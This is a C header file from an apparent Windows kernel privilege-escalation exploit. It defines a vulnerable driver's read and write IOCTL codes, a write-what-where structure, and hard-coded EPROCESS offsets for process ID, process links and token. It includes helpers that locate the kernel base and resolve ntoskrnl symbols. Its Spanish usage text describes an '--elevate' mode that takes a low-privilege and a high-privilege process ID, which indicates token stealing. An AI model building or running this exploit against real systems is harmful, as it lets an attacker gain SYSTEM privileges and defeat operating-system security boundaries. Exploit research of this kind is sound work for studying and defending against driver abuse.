
#ifndef HELPERS_H
#define HELPERS_H

    #include <windows.h>
    #include <psapi.h>
    #include <stdio.h>

    #pragma comment(lib, "psapi.lib")
    #pragma comment(lib, "kernel32.lib")

    #define A_WRITE_IOCTL_CODE 0x9B0C1EC8
    #define A_READ_IOCTL_CODE 0x9B0C1EC4

    #define UNIQUE_PROCESS_ID_OFFSET 0x440
    #define ACTIVE_PROCESS_LINK_OFFSET 0x448
    #define TOKEN_OFFSET 0x4B8

    #define RtlBaseToOffset(Base, Offset) \
    ((ULONG_PTR)((PCHAR)(Base) + (ULONG_PTR)(Offset)))

    struct RW_WHAT_WHERE{
        DWORD64     _padding1;   //00000000
        DWORD64     _what;       // WHAT
        DWORD64     _paddin2;    //00000000
        DWORD64     _where;      //WHERE
    };

    BOOL MemArbitraryRead(HANDLE hdriver, DWORD64 addr, DWORD64* outValue);
    BOOL MemArbitraryWrite(HANDLE hdriver, DWORD64 addr, DWORD64 value);

    static_assert(sizeof(RW_WHAT_WHERE) == 32, "struct size mismatch");

    // ============================================================
    // KERNEL BASE/SYMBOLS RESOLVERS
    // ============================================================
    static inline PVOID ResolveKbase(void){

        PVOID   lp_drivers[1024] = { 0 };
        DWORD   bytesReturned;

        if (EnumDeviceDrivers(lp_drivers, sizeof(lp_drivers), &bytesReturned)) return lp_drivers[0];

        return NULL;
    }

    static inline ULONG_PTR ResolveKsym(const char *symbol_name){
        PVOID        k_base      = NULL;
        HMODULE      u_ntos      = NULL;
        ULONG_PTR    offset      = 0;
        PCHAR        symbol_addr = 0;

        k_base = ResolveKbase();
        if (!k_base) return 0;

        u_ntos = LoadLibraryExA("C:\\Windows\\System32\\ntoskrnl.exe", NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!u_ntos) return 0;

        symbol_addr = (PCHAR)GetProcAddress(u_ntos, symbol_name);
        if (!symbol_addr) {
            FreeLibrary(u_ntos);
            return 0;
        }

        offset = (ULONG_PTR)(symbol_addr - (PCHAR)u_ntos);
        FreeLibrary(u_ntos);

        return RtlBaseToOffset(k_base, offset);
    }

    static inline void PrintUsage(const char* argv0) {
        printf("Uso:\n");
        printf("  %s --elevate <low_priv_proc> <high_priv_proc>\n\n", argv0);
        printf("Ejemplo:\n");
        printf("  %s --elevate <low_pid> <high_pid>\n", argv0);
    }
    
#endif //HELPERS_H